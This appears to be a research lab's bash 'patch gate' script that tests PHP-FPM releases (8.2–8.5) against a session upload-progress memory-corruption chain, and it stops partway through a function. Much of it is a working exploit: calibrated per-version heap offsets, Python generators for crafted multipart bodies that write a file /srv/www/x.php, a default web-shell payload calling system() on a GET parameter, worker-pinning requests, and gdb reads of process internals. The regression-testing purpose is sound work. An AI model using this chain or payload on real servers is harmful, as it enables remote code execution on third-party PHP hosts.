#!/bin/bash
# r41_patch_gate4w.sh -- fail-closed FPM pure-HTTP patch gate, 4-worker pin
# mode (curated release copy; lab-only).
#
# Copyright (c) 2026 The PHP2Shell research authors. MIT License (see LICENSE).
# LAB-ONLY: authorized lab targets only. This gate starts/stops containers,
# holds sleepers, runs container commands and sends HTTP traffic; never point
# it at third-party systems. See ACCEPTABLE_USE.md and SECURITY.md.
#
# Branch-selected profiles: 8512/8511 (8.5), 8235/8234 (8.2), 8336/8335
# (8.3), 8427/8426 (8.4). The gate prints `PATCH GATE: closed` exit 0
# (patched), `PATCH GATE: OPEN (REGRESSION)` exit 3 (unexpectedly
# exploitable), or `PATCH GATE: ERROR ...` exit 2 (config/instrument error -
# never a pass). Vulnerable controls must print
# `PATCH GATE: OPEN (expected on vulnerable)` exit 3.
#
# Fail-closed hardening (round 11, reverse-review r52):
#   * a gate PASS requires the BG scan to be VERIFIED: `GDB_BG=0` gives
#     `ERROR (BG unverified)` exit 2 unless `ALLOW_BG_UNVERIFIED=1` (DIAG only);
#   * a gate PASS/OPEN also requires `sleepers_alive=3/3` and `NO_PIN!=1`
#     (NO_PIN is comparison-only);
#   * the lab page sha256 is pinned (`EXPECT_PAGE_SHA256`, canonical
#     `ca83aff9...41829`); a mismatch is ERROR exit 2.
# Negative controls (documented in docs/research/fpm-8427-gate-4w-poc.md):
# `GDB_BG=0` -> exit 2; `SLEEP_T=1` -> exit 2.
#
# 8.4 (registered): the 8.4 branch needs its own prime plane. Measured on
# 8.4.26: d=chunk+0xFD000, E=d+0x1C000, DT=d+0x3000 => progress=chunk+0x61000,
# aim=-93688, AIM_W=AIM+(array_push-writer)/8=-99777, S=0x84000,
# SP=7,050,470, BG level +0x370. With these the 8.4.26 control is 3/3 OPEN
# expected and 8.4.27 is 3/3 closed (matrix `fpm-8427-gate-4w`). The 8.5- and
# 8.2-family constants do NOT separate patched/vulnerable on 8.4 (see
# docs/research/fpm-8427-gate-4w-poc.md); a positive control is not optional.
#
# Preflight (before any verdict): PHP version prefix must match the profile,
# `EXPECT_IMAGE` pins the docker image ID, and the web-context ini must show
# cleanup=Off / enabled=On / memory_limit=128M; a mismatch is ERROR/exit 2.
# Pin `EXPECT_IMAGE` to the lab image digest on every run.
#
# BG level offsets are parsed three ways: 8.2 +0x358, 8.3 +0x360,
# 8.4/8.5 +0x370 (all read; any ==1 with level1_count==1 means "level 1").
#
# Release usage (from the repository root; VM lab paths are overridable via
# WWW_CONF / INI / IMAGE / WSH / SLEEP_T / NO_PIN / GDB_BG):
#   PROFILE=8512 WORKERS=4 CAL=p2s-gate8512-4w PORT=19143 RUNS=3 \
#     bash labs/fpm/r41_patch_gate4w.sh    # 8.5.12 gate, expect closed/0
#   PROFILE=8511 WORKERS=4 CAL=p2s-gate8511-4w PORT=19144 RUNS=3 \
#     bash labs/fpm/r41_patch_gate4w.sh    # 8.5.11 control, expect OPEN/3
#   PROFILE=8235 WORKERS=4 CAL=p2s-gate8235-4w PORT=19148 RUNS=3 \
#     EXPECT_IMAGE=sha256:ac855a04... bash labs/fpm/r41_patch_gate4w.sh
#   PROFILE=8234 WORKERS=4 CAL=p2s-gate8234-4w PORT=19149 RUNS=3 \
#     bash labs/fpm/r41_patch_gate4w.sh    # 8.2.34 control, expect OPEN/3
#   PROFILE=8336 WORKERS=4 CAL=p2s-gate8336-4w PORT=19152 RUNS=3 \
#     EXPECT_IMAGE=sha256:b229bcfd... bash labs/fpm/r41_patch_gate4w.sh
#   PROFILE=8335 WORKERS=4 CAL=p2s-gate8335-4w PORT=19153 RUNS=3 \
#     bash labs/fpm/r41_patch_gate4w.sh    # 8.3.35 control, expect OPEN/3
#   PROFILE=8427 WORKERS=4 CAL=p2s-gate8427-4w PORT=19154 RUNS=3 \
#     EXPECT_IMAGE=sha256:26ba8279... bash labs/fpm/r41_patch_gate4w.sh
#   PROFILE=8426 WORKERS=4 CAL=p2s-gate8426-4w PORT=19155 RUNS=3 \
#     EXPECT_IMAGE=sha256:6658d56c... bash labs/fpm/r41_patch_gate4w.sh
#     # 8.4.27 gate closed / 8.4.26 control OPEN expected
# Evidence: docs/research/fpm-8512-gate-4w.md, fpm-8235-gate-4w.md,
# fpm-8336-gate-4w.md, fpm-8427-gate-4w-poc.md,
# gate-family-crossbranch-2026-10-31.md.
#
# r41_patch_gate4w.sh -- fail-closed FPM pure-HTTP patch gate, 4-worker pin mode.
#
# Profiles (branch-selected):
#   8512 / 8511 : 8.5.12 patched gate       / 8.5.11 vulnerable control
#   8235 / 8234 : 8.2.35 patched gate (true-CVE fix side) / 8.2.34 control
#   Unknown PROFILE -> exit 2.
#
# Purpose
#   The single-worker gate scripts do not cover the multi-worker blind spot.
#   This script runs the same pure-HTTP chain in WORKERS=4 pin mode: every prime
#   segment first pins 3 of the 4 static children with /_sleep.php (marker =
#   child pid) so the next GET prime lands on the single free child, then the
#   stage request is sent to that child.
#
#   Patched gate profiles (8512/8235), expected verdict:
#       PATCH GATE: closed                         -> exit 0
#       PATCH GATE: OPEN (REGRESSION)              -> exit 3
#       PATCH GATE: ERROR ...                      -> exit 2 (NEVER a pass)
#   Vulnerable control profiles (8511/8234):
#       PATCH GATE: OPEN (expected on vulnerable)  -> exit 3
#       PATCH GATE: CLOSED (unexpected on control) -> exit 2 (instrument/claim
#                                                     inconsistency, not a pass)
#
# Constants per profile / expected signatures:
#   8.5: S=0x97000 AIM=-103416 AIM_W=-109505 SP=7,050,470; gate SR 469->374->724
#   8.2: S=0x84000 AIM=-94200  AIM_W=-100289 SP=7,048,390; gate SR 456->361->698
#   (the SR byte counts are recorded/reported, NOT asserted: the gate semantics
#    asserted here are "stale not consumed" = SR != 47/70, no "|i:0;", no writer)
#
# Gate assertions (patched profiles)
#   * pin: children=4, sleeper markers=3, free child count=1, children set
#     unchanged across the prime GET.
#   * grow SP session exact P_SESS_SP + version/image preflight
#     (EXPECT_IMAGE pins the docker image ID; version prefix must match).
#   * prime: HTTP 500 + 0-byte body; OOM evidence = fatal text in the docker
#     logs delta, or (log_errors=Off lab) the measured 500/0B signature +
#     truncated SP session; recorded as fatal=text|inferred.
#   * one-shot gdb BG(unserialize) read (allowed for gate evidence only):
#     every child level==0 (BG level offset: 8.5 +0x370, 8.2 +0x358; both read).
#   * R2a/R2a(K2)/R3: HTTP 200; SR != 47/70; no "|i:0;"; no x.php; no uid.
#   * /plain.php health 200.
#
# Reproducibility: containers + www-4.conf + php-128m.ini + zz-r40-lab.ini
# (cleanup=Off) are created by the operator; this script only uses HTTP + one
# gdb read and creates the lab pages (_r41prime2.php, _sleep.php) idempotently.
# It never writes session files or x.php itself.
#
# Authorized lab use only.  Does not touch other containers.
set -u

CAL=${CAL:-}
PORT=${PORT:-}
URL=${URL:-}
PROFILE=${PROFILE:-}
RUNS=${RUNS:-${ROUNDS:-1}}
GDB_BG=${GDB_BG:-1}
NO_PIN=${NO_PIN:-0}   # 1 = same script without the 3-sleeper pin (comparison only)
EXPECT_IMAGE=${EXPECT_IMAGE:-}  # optional image ID pin (sha256:... or bare id)
# Fail-closed hardening (2026-10-31 round 11, reverse-review r52):
#   * a gate PASS requires BG VERIFIED by the one-shot gdb scan; GDB_BG=0 is
#     only accepted with ALLOW_BG_UNVERIFIED=1 (DIAG/re-baseline), otherwise
#     the verdict is `PATCH GATE: ERROR (BG unverified)` exit 2;
#   * a gate PASS also requires the 3-sleeper pin to be alive at stage time
#     (sleepers_alive=3/3) and NO_PIN!=1 (NO_PIN is comparison-only);
#   * the lab page sha256 is pinned (EXPECT_PAGE_SHA256, canonical ca83aff9...).
ALLOW_BG_UNVERIFIED=${ALLOW_BG_UNVERIFIED:-0}
EXPECT_PAGE_SHA256=${EXPECT_PAGE_SHA256:-ca83aff9fe0a0fd8400901a41f366746afe61dc627c7f4a767dff5139ce41829}
BG_UNVERIFIED_ERR=0
CODE=${CODE:-'<?php system($_GET[0]); ?>'}
SID_SP=${SID_SP:-acdbeef0acdbeef0acdbeef0acdbeef0}
SID_SR=${SID_SR:-ccccddddeeeeffff0000111122223333}
PRIME_Q=${PRIME_Q:-mb=114&pad=64}
BND=----r41d
SLEEP_T=${SLEEP_T:-60}

case "$PROFILE" in
  # 8.5 branch: 8512 = patched gate (closed expected), 8511 = vulnerable control
  8512) IS_GATE=1; P_EXPECT_VER=8.5.12
        P_S=0x97000; P_AIM=-103416; P_AIM_W=-109505; P_SESS_SP=7050470; P_NL=8 ;;
  8511) IS_GATE=0; P_EXPECT_VER=8.5.11
        P_S=0x97000; P_AIM=-103416; P_AIM_W=-109505; P_SESS_SP=7050470; P_NL=8 ;;
  # 8.2 branch (true-CVE fix side): 8235 = patched gate, 8234 = vulnerable control
  8235) IS_GATE=1; P_EXPECT_VER=8.2.35
        P_S=0x84000; P_AIM=-94200; P_AIM_W=-100289; P_SESS_SP=7048390; P_NL=8 ;;
  8234) IS_GATE=0; P_EXPECT_VER=8.2.34
        P_S=0x84000; P_AIM=-94200; P_AIM_W=-100289; P_SESS_SP=7048390; P_NL=8 ;;
  # 8.3 branch: 8336 = patched gate, 8335 = vulnerable control.
  # NOTE: 8.3 constants are CANDIDATES taken from the 8.2 gate/chain shape; the
  # first run is a DIAG run and must be re-baselined if grow/prime/SR differ
  # (r41_http_chain.sh has no 8.3 profile yet).  BG: 8.3 data=+0x358 level=+0x360.
  8336) IS_GATE=1; P_EXPECT_VER=8.3.36
        P_S=0x84000; P_AIM=-94200; P_AIM_W=-100289; P_SESS_SP=7048390; P_NL=8 ;;
  8335) IS_GATE=0; P_EXPECT_VER=8.3.35
        P_S=0x84000; P_AIM=-94200; P_AIM_W=-100289; P_SESS_SP=7048390; P_NL=8 ;;
  # 8.4 branch: 8427 = patched gate, 8426 = vulnerable control.
  # BG layout is 8.4/8.5 family (+0x368 data / +0x370 level), BUT the 8.4 prime
  # plane differs from 8.5: measured d=chunk+0xFD000, E=d+0x1C000, DT=d+0x3000
  # (8.5 d=0x110000).  8.4.26 calibrated constants (2026-10-31 round 10):
  #   S=0x84000 (copy1=d+0x1018), progress=chunk+0x61000 =>
  #   AIM=(0x61050-(E+0x10))/8=-93688;
  #   AIM_W=AIM+(array_push-writer)/8=AIM+(0x62050-0x56208)/8=-99777; SP=7,050,470.
  8427) IS_GATE=1; P_EXPECT_VER=8.4.27
        P_S=0x84000; P_AIM=-93688; P_AIM_W=-99777; P_SESS_SP=7050470; P_NL=8 ;;
  8426) IS_GATE=0; P_EXPECT_VER=8.4.26
        P_S=0x84000; P_AIM=-93688; P_AIM_W=-99777; P_SESS_SP=7050470; P_NL=8 ;;
  *) echo "PATCH GATE: ERROR unknown PROFILE=${PROFILE:-<unset>} (use 8511|8512|8234|8235|8335|8336|8426|8427); exit 2" >&2; exit 2 ;;
esac
# BG level offset selector (data offset is 8 bytes lower):
#   8.2 (8234/8235): level +0x358, data +0x350
#   8.3 (8335/8336): level +0x360, data +0x358
#   8.4/8.5 (8426/8427/8511/8512): level +0x370, data +0x368
case "$PROFILE" in
  8234|8235) P_BG_LVL=358 ;;
  8335|8336) P_BG_LVL=360 ;;
  *)         P_BG_LVL=370 ;;
esac
S=${S:-$P_S}; NL=${NL:-$P_NL}
AIM=${AIM:-$P_AIM}; AIM_W=${AIM_W:-$P_AIM_W}; SESS_SP_EXPECT=${SESS_SP_EXPECT:-$P_SESS_SP}
[ -n "$CAL" ] || { echo "PATCH GATE: ERROR CAL is required; exit 2" >&2; exit 2; }
[ -n "$PORT" ] || { echo "PATCH GATE: ERROR PORT is required; exit 2" >&2; exit 2; }
[ -n "$URL" ] || URL="http://127.0.0.1:$PORT"
case "$GDB_BG" in 0|1) : ;; *) echo "PATCH GATE: ERROR GDB_BG=${GDB_BG} (0|1); exit 2" >&2; exit 2 ;; esac

W=$(mktemp -d /tmp/r41gate4w.XXXXXX) || { echo "PATCH GATE: ERROR mktemp; exit 2" >&2; exit 2; }
trap 'kill_sleepers >/dev/null 2>&1 || true; rm -rf "$W"' EXIT

# ---------------- helpers ----------------
cpid() {
  docker exec "$CAL" sh -c 'for p in /proc/[0-9]*; do [ "$(cat "$p/comm" 2>/dev/null)" = "php-fpm" ] || continue; c=$(tr "\0" " " < "$p/cmdline" 2>/dev/null); case "$c" in *"pool www"*) echo "${p#/proc/}";; esac; done' 2>/dev/null | head -1
}
children() {
  docker exec "$CAL" sh -c 'for p in /proc/[0-9]*; do [ "$(cat "$p/comm" 2>/dev/null)" = "php-fpm" ] || continue; c=$(tr "\0" " " < "$p/cmdline" 2>/dev/null); case "$c" in *"pool www"*) echo "${p#/proc/}";; esac; done' 2>/dev/null | tr '\n' ' ' | sed 's/ *$//'
}
up() { local i st; for i in $(seq 1 60); do st=$(curl -s -o /dev/null -w '%{http_code}' --max-time 2 "$URL/index.php" || true); [ "$st" = "200" ] && return 0; sleep 0.3; done; return 1; }
sess_size() { docker exec "$CAL" sh -c "stat -c %s /var/lib/php/sessions/sess_$1 2>/dev/null || echo MISSING"; }
sess_tail() { docker exec "$CAL" sh -c "head -c 160 /var/lib/php/sessions/sess_$1 2>/dev/null" 2>/dev/null | tr -d '\0'; }
sess_count() { # sid pattern -> occurrence count in the raw session file (ASCII)
  docker exec "$CAL" sh -c "grep -ao -- '$2' /var/lib/php/sessions/sess_$1 2>/dev/null | wc -l" 2>/dev/null | tr -dc '0-9'
}
sleepers_alive() { # host-side sleeper curls still alive / distinct markers
  local j n=0 m
  for j in ${SLEEP_JOBS:-}; do kill -0 "$j" 2>/dev/null && n=$((n + 1)); done
  m=$(docker exec "$CAL" sh -c 'cat /tmp/p4w_marker_* 2>/dev/null | sort -u | wc -l' 2>/dev/null | tr -dc '0-9')
  echo "$n/${m:-0}"
}
preflight() { # version + optional image pin + lab ini sanity; failure => exit 2
  local ver id cleanup enabled mem
  ver=$(docker exec "$CAL" php -r 'echo PHP_VERSION;' 2>/dev/null | tr -d '\r')
  case "$ver" in
    "$P_EXPECT_VER"|"$P_EXPECT_VER"-*) : ;;
    *) echo "PATCH GATE: ERROR version=[$ver] expected prefix [$P_EXPECT_VER] for PROFILE=$PROFILE; exit 2"; return 1 ;;
  esac
  echo "VERSION OK php=$ver expected_prefix=$P_EXPECT_VER"
  id=$(docker inspect "$CAL" --format '{{.Image}}' 2>/dev/null | tr -d '\r')
  if [ -n "$EXPECT_IMAGE" ]; then
    if [ "${id#sha256:}" != "${EXPECT_IMAGE#sha256:}" ]; then
      echo "PATCH GATE: ERROR image=[$id] expected=[$EXPECT_IMAGE]; exit 2"; return 1
    fi
    echo "IMAGE_PIN OK $id"
  else
    echo "IMAGE $id (EXPECT_IMAGE unset: not pinned)"
  fi
  cleanup=$(docker exec "$CAL" php -i 2>/dev/null | sed -n 's/^session.upload_progress.cleanup => //p' | head -1 | tr -d '\r')
  enabled=$(docker exec "$CAL" php -i 2>/dev/null | sed -n 's/^session.upload_progress.enabled => //p' | head -1 | tr -d '\r')
  mem=$(docker exec "$CAL" php -i 2>/dev/null | sed -n 's/^memory_limit => //p' | head -1 | tr -d '\r')
  echo "CONFIG cleanup=[$cleanup] enabled=[$enabled] memory_limit=[$mem]"
  case "$cleanup" in Off*) : ;; *) echo "PATCH GATE: ERROR cleanup not Off: [$cleanup]; exit 2"; return 1 ;; esac
  case "$enabled" in On*) : ;; *) echo "PATCH GATE: ERROR enabled not On: [$enabled]; exit 2"; return 1 ;; esac
  case "$mem" in 128M*) : ;; *) echo "PATCH GATE: ERROR memory_limit != 128M: [$mem]; exit 2"; return 1 ;; esac
  return 0
}
post() { # $1 body file, $2 sid
  curl -s -o /dev/null -w '%{http_code}' --max-time 60 -H "Cookie: PHPSESSID=${2:-$SID_SR}" \
    -H "Content-Type: multipart/form-data; boundary=$BND" --data-binary "@$1" "$URL/plain.php"
}
kill_sleepers() { local j; for j in ${SLEEP_JOBS:-}; do kill "$j" 2>/dev/null || true; done; SLEEP_JOBS=""; }
clean_round() {
  kill_sleepers
  docker exec "$CAL" sh -c 'rm -f /tmp/p4w_marker_*' >/dev/null 2>&1
  docker restart "$CAL" >/dev/null 2>&1; sleep 2
  up || return 1
  docker exec "$CAL" sh -c "rm -f /var/lib/php/sessions/sess_$SID_SR /var/lib/php/sessions/sess_$SID_SP /srv/www/x.php" >/dev/null 2>&1
}
install_pages() {
  local ok=0
  docker exec "$CAL" sh -c 'test -f /srv/www/_r41prime2.php' >/dev/null 2>&1 && \
    docker exec "$CAL" sh -c 'grep -q _r41prime2 /srv/www/_r41prime2.php && grep -q session_start /srv/www/_r41prime2.php' >/dev/null 2>&1 && ok=1
  if [ "$ok" = "0" ]; then
    docker exec -i "$CAL" sh -c 'cat > /srv/www/_r41prime2.php' <<'PHP'
<?php /* _r41prime2.php */
$pad=(int)($_GET["pad"]??0);
$mb=(int)($_GET["mb"]??0);
$keep=array();
for($i=0;$i<$pad;$i++){ $keep[]=str_repeat("Z",4080); }
if($mb>0){ $keep[]=str_repeat("B",$mb*1048576); }
session_start();
echo "OK";
PHP
    echo "INSTALLED /srv/www/_r41prime2.php (documented precondition)"
  fi
  if ! docker exec "$CAL" sh -c 'grep -q p4w_sleep /srv/www/_sleep.php' >/dev/null 2>&1; then
    docker exec -i "$CAL" sh -c 'cat > /srv/www/_sleep.php' <<'PHP'
<?php /* p4w_sleep */
$id = preg_replace('/[^0-9]/', '', (string)($_GET["id"] ?? "0"));
file_put_contents('/tmp/p4w_marker_' . $id, getmypid() . "\n");
sleep((int)($_GET["t"] ?? 60));
echo "SLEEP";
PHP
    echo "INSTALLED /srv/www/_sleep.php (WORKERS=4 lab scheduling precondition)"
  fi
}
page_pin() { # fail-closed: the lab prime page is a documented precondition
  local got
  got=$(docker exec "$CAL" sh -c 'sha256sum /srv/www/_r41prime2.php 2>/dev/null' | cut -d' ' -f1 | tr -d '\r')
  if [ "$got" != "$EXPECT_PAGE_SHA256" ]; then
    echo "PATCH GATE: ERROR page_sha=[${got:-MISSING}] expected=[$EXPECT_PAGE_SHA256]; exit 2"
    return 1
  fi
  echo "PAGE_SHA OK $got"
}
genprog() { IDX=$1 KEYLEN=$2 W=$W BND=$BND python3 - <<'PY'
import os
idx = int(os.environ["IDX"]); keylen = int(os.environ["KEYLEN"])
W = os.environ["W"]; BND = os.environ["BND"].encode()
key = (b"K" * keylen) + ("%04d" % idx).encode()
parts = [b"--" + BND + b'\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n' + key + b"\r\n"]
for j in range(20):
    fn = (b"F" * 100) + ("%04d%02d" % (idx, j)).encode() + b".bin"
    parts.append(b"--" + BND + b'\r\nContent-Disposition: form-data; name="f%02d"; filename="' % j + fn
                 + b'"\r\nContent-Type: application/octet-stream\r\n\r\nZ\r\n')
parts.append(b"--" + BND + b"--\r\n")
open(W + "/gb", "wb").write(b"".join(parts))
PY
}
grow_sp() {
  docker exec "$CAL" sh -c "rm -f /var/lib/php/sessions/sess_$SID_SP" >/dev/null 2>&1
  local i code
  for i in 1 2 3 4 5 6 7; do
    genprog "$i" 8
    code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 180 -H "Cookie: PHPSESSID=$SID_SP" \
      -H "Content-Type: multipart/form-data; boundary=$BND" --data-binary @"$W/gb" "$URL/plain.php")
    [ "$code" = "200" ] || { echo "GROW FAIL i=$i code=$code" >&2; return 1; }
  done
  genprog 8 7000000
  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 180 -H "Cookie: PHPSESSID=$SID_SP" \
    -H "Content-Type: multipart/form-data; boundary=$BND" --data-binary @"$W/gb" "$URL/plain.php")
  [ "$code" = "200" ] || { echo "GROW FAIL big code=$code" >&2; return 1; }
}
mkprog() { KEYV=$1 W=$W BND=$BND python3 - <<'PY'
import os
key = os.environ["KEYV"].encode(); W = os.environ["W"]; BND = os.environ["BND"].encode()
parts = [b"--" + BND + b'\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n' + key + b"\r\n"]
parts.append(b"--" + BND + b'\r\nContent-Disposition: form-data; name="f"; filename="' + b"F" * 100
             + b'.bin"\r\nContent-Type: application/octet-stream\r\n\r\nZ\r\n')
parts.append(b"--" + BND + b"--\r\n")
open(W + "/progbody", "wb").write(b"".join(parts))
PY
}
mkbody() {
  local BMODE=$1 BAIM=$2 BKEY=$3 OUTN=${OUT:-stagebody}
  # note: do NOT use "VAR=x func" for functions - the assignments are scoped to
  # the command's environment and vanish for the shell commands after python3.
  MODE="$BMODE" AIMV="$BAIM" KEYV="$BKEY" S="$S" NL="$NL" W="$W" BND="$BND" OUT="$OUTN" python3 - <<'PY'
import os, struct
mode = os.environ["MODE"]; aim = int(os.environ["AIMV"]); key = os.environ["KEYV"].encode()
S = int(os.environ["S"], 0); nl = int(os.environ["NL"])
W = os.environ["W"]; BND = os.environ["BND"].encode(); out = os.environ["OUT"]
parts = []
for i in range(nl):
    parts.append(b"--" + BND + b'\r\nContent-Disposition: form-data; name="L%03d"\r\n\r\n' % i
                 + b"L" * 0xE00 + b"\r\n")
b = bytearray(S)
b[0x1FE8:0x1FF0] = struct.pack("<Q", 0)
if mode == "r2a":
    b[0x1AFE8:0x1AFF0] = struct.pack("<q", aim)
elif mode == "r3":
    b[0x1FF8:0x2008] = b"\x00" * 0x10
    b[0x2008:0x2018] = b"\x00" * 0x10
    b[0x2018:0x2020] = struct.pack("<Q", 15)
    b[0x2020:0x2020 + 15] = b"/srv/www/x.php\x00"
    b[0x1AFE8:0x1AFF0] = struct.pack("<q", aim)
assert len(b) == S, ("BIG value length must equal S", len(b), S)
parts.append(b"--" + BND + b'\r\nContent-Disposition: form-data; name="BIG"\r\n\r\n' + bytes(b) + b"\r\n")
parts.append(b"--" + BND + b'\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n' + key + b"\r\n")
parts.append(b"--" + BND + b'\r\nContent-Disposition: form-data; name="f"; filename="a.bin"\r\nContent-Type: application/octet-stream\r\n\r\nZ\r\n')
parts.append(b"--" + BND + b"--\r\n")
open(W + "/" + out, "wb").write(b"".join(parts))
PY
  # E1 guard: sidecar with the intended mode/key.  The caller MUST verify this
  # immediately before sending (see body_ok) so a stale/wrong body can never be
  # mistaken for the r2a/r3 stage (the 2026-10-31 first-run false positive).
  printf 'mode=%s\nkey=%s\n' "$BMODE" "$BKEY" > "$W/$OUTN.meta"
}
body_ok() { # outfile expected_mode expected_key -> sets BODY_OK=1 and prints sha
  local f="$W/$1" want_mode="$2" want_key="$3" got_mode got_key
  BODY_OK=0
  [ -f "$f" ] || { echo "BODY FAIL missing $1"; return 1; }
  got_mode=$(sed -n 's/^mode=//p' "$W/$1.meta" 2>/dev/null | head -1)
  got_key=$(sed -n 's/^key=//p' "$W/$1.meta" 2>/dev/null | head -1)
  [ "$got_mode" = "$want_mode" ] || { echo "BODY FAIL $1 mode=[$got_mode] want=[$want_mode]"; return 1; }
  [ "$got_key" = "$want_key" ] || { echo "BODY FAIL $1 key mismatch"; return 1; }
  BODY_OK=1
  echo "BODY $1 mode=$got_mode bytes=$(stat -c %s "$f") sha256=$(sha256sum "$f" | cut -d' ' -f1)"
}
# --- 4-worker pinning (3 sleeping children, 1 free) ---
SLEEP_JOBS=""
pin_sleepers() {
  local attempt i n id child_cnt free
  for attempt in 1 2 3; do
    for i in $(seq 1 40); do child_cnt=$(children | wc -w); [ "$child_cnt" -ge 4 ] && break; sleep 0.1; done
    [ "$child_cnt" -ge 4 ] || { echo "PIN FAIL children=$child_cnt (<4)"; return 1; }
    docker exec "$CAL" sh -c 'rm -f /tmp/p4w_marker_*' >/dev/null 2>&1
    SLEEP_JOBS=""
    for id in 1 2 3; do
      curl -s -o /dev/null --max-time 200 "$URL/_sleep.php?t=$SLEEP_T&id=$id" >/dev/null 2>&1 &
      SLEEP_JOBS="$SLEEP_JOBS $!"
      sleep 0.35
    done
    n=0
    for i in $(seq 1 80); do
      n=$(docker exec "$CAL" sh -c 'cat /tmp/p4w_marker_* 2>/dev/null | sort -u | wc -l' 2>/dev/null | tr -d '\r')
      [ "${n:-0}" -ge 3 ] && break
      sleep 0.1
    done
    P4W_SLP=$(docker exec "$CAL" sh -c 'cat /tmp/p4w_marker_* 2>/dev/null | sort -u' 2>/dev/null | tr '\n' ' ' | sed 's/ *$//')
    P4W_MARKERS=$(echo "$P4W_SLP" | wc -w)
    free=""
    for i in $(children); do
      case " $P4W_SLP " in *" $i "*) : ;; *) free="$free $i" ;; esac
    done
    P4W_FREE_PID=$(echo "$free" | sed 's/^ *//; s/ *$//')
    P4W_FREE_CNT=$(echo "$P4W_FREE_PID" | wc -w)
    if [ "$P4W_MARKERS" = "3" ] && [ "$P4W_FREE_CNT" = "1" ]; then
      echo "PIN attempt=$attempt sleepers=[$P4W_SLP] markers=3 free=[$P4W_FREE_PID]"
      return 0
    fi
    echo "PIN attempt=$attempt FAIL markers=$P4W_MARKERS free_cnt=$P4W_FREE_CNT sleepers=[$P4W_SLP]; restart+retry"
    kill_sleepers
    docker restart "$CAL" >/dev/null 2>&1; sleep 2; up || return 1
  done
  return 1
}
bg_scan() { # one-shot gdb on all children; sets P4W_LEVELS (pid:l358/l360/l370) and counts
  P4W_LEVELS=""; P4W_LVL1_PIDS=""; P4W_LVL1_CNT=0
  [ "$GDB_BG" = "1" ] || { echo "PINCHECK gdb=0 (skipped; BG=[UNVERIFIED])"; return 0; }
  docker exec -i "$CAL" sh -c 'cat > /tmp/p4w_gate_bg.gdb' <<'GDB'
set pagination off
set confirm off
set height 0
set debuginfod enabled off
printf "D350=%p\n", (void*)*(void**)&((char*)&basic_globals)[0x350]
printf "L358=%u\n", *(unsigned int*)&((char*)&basic_globals)[0x358]
printf "D358=%p\n", (void*)*(void**)&((char*)&basic_globals)[0x358]
printf "L360=%u\n", *(unsigned int*)&((char*)&basic_globals)[0x360]
printf "D368=%p\n", (void*)*(void**)&((char*)&basic_globals)[0x368]
printf "L370=%u\n", *(unsigned int*)&((char*)&basic_globals)[0x370]
set $d=(void*)*(void**)&((char*)&basic_globals)[0x368]
printf "D0=%p\n", *(void**)$d
printf "D8=%p\n", *(void**)((char*)$d+8)
printf "D10=%p\n", *(void**)((char*)$d+0x10)
printf "PSG188=%p\n", *(void**)&((char*)&ps_globals)[0x188]
printf "PSG60=%p\n", *(void**)&((char*)&ps_globals)[0x60]
detach
quit
GDB
  local p out l358 l360 l370 lvl var d368 d0 d8 d10 psg188 psg60
  for p in $(children); do
    out=$(docker exec "$CAL" timeout 25 gdb -batch -q -p "$p" -x /tmp/p4w_gate_bg.gdb 2>&1 || true)
    l358=$(echo "$out" | sed -n 's/^L358=\([0-9]*\).*/\1/p' | head -1)
    l360=$(echo "$out" | sed -n 's/^L360=\([0-9]*\).*/\1/p' | head -1)
    l370=$(echo "$out" | sed -n 's/^L370=\([0-9]*\).*/\1/p' | head -1)
    d368=$(echo "$out" | sed -n 's/^D368=0x\([0-9a-f]*\).*/\1/p' | head -1)
    d0=$(echo "$out" | sed -n 's/^D0=0x\([0-9a-f]*\).*/\1/p' | head -1)
    d8=$(echo "$out" | sed -n 's/^D8=0x\([0-9a-f]*\).*/\1/p' | head -1)
    d10=$(echo "$out" | sed -n 's/^D10=0x\([0-9a-f]*\).*/\1/p' | head -1)
    psg188=$(echo "$out" | sed -n 's/^PSG188=0x\([0-9a-f]*\).*/\1/p' | head -1)
    psg60=$(echo "$out" | sed -n 's/^PSG60=0x\([0-9a-f]*\).*/\1/p' | head -1)
    P4W_LEVELS="$P4W_LEVELS $p:${l358:-?}/${l360:-?}/${l370:-?}:${d368:-?}"
    var="l${P_BG_LVL}"
    lvl="${!var}"
    if [ "${lvl:-0}" = "1" ]; then
      P4W_LVL1_PIDS="$P4W_LVL1_PIDS $p"; P4W_LVL1_CNT=$((P4W_LVL1_CNT + 1))
      echo "GEOM pid=$p d=${d368:-?} d0=${d0:-?} d8=${d8:-?} d10=${d10:-?} psg188=${psg188:-?} psg60=${psg60:-?}"
    fi
  done
  P4W_LVL1_PIDS=$(echo "$P4W_LVL1_PIDS" | sed 's/^ *//; s/ *$//')
  echo "PINCHECK free_pid=${P4W_FREE_PID:-?} levels[358/360/370:data368]=[${P4W_LEVELS# }] level_field=+0x${P_BG_LVL} level1_pids=[${P4W_LVL1_PIDS}] level1_count=$P4W_LVL1_CNT gdb=1"
}
prime() { # restart -> grow -> restart -> pin -> GET prime; sleepers stay held for the stage
  docker restart "$CAL" >/dev/null 2>&1; sleep 2; up || { PRIME_CODE=MISSING; return 1; }
  grow_sp || { PRIME_CODE=GROWFAIL; return 1; }
  SESS_SP_ACTUAL=$(sess_size "$SID_SP")
  docker restart "$CAL" >/dev/null 2>&1; sleep 2; up || { PRIME_CODE=UPFAIL; return 1; }
  P4W_MARKERS=0; P4W_SLP=""; P4W_FREE_PID=""; P4W_FREE_CNT=0; P4W_LEVELS=""; P4W_LVL1_CNT=0
  if [ "$NO_PIN" = "1" ]; then
    # comparison mode: no sleeper pin.  The prime/stage requests are serialized
    # by this script but php-fpm may hand them to different idle children; this
    # is a "no-pin on the same container" data point, not pm=static 1.
    P4W_MARKERS=3; P4W_FREE_PID=$(children | awk '{print $1}'); P4W_FREE_CNT=1
  else
    pin_sleepers || { PRIME_CODE=PINFAIL; kill_sleepers; return 1; }
  fi
  PRIME_CHILDREN_BEFORE=$(children)
  local log_before log_delta
  log_before=$(docker logs "$CAL" 2>&1 | wc -l)
  PRIME_CODE=$(curl -s -o "$W/primebody" -w '%{http_code}' --max-time 180 -H "Cookie: PHPSESSID=$SID_SP" "$URL/_r41prime2.php?$PRIME_Q")
  PRIME_BODY_BYTES=$(stat -c %s "$W/primebody" 2>/dev/null || echo '?')
  PRIME_CHILDREN_AFTER=$(children)
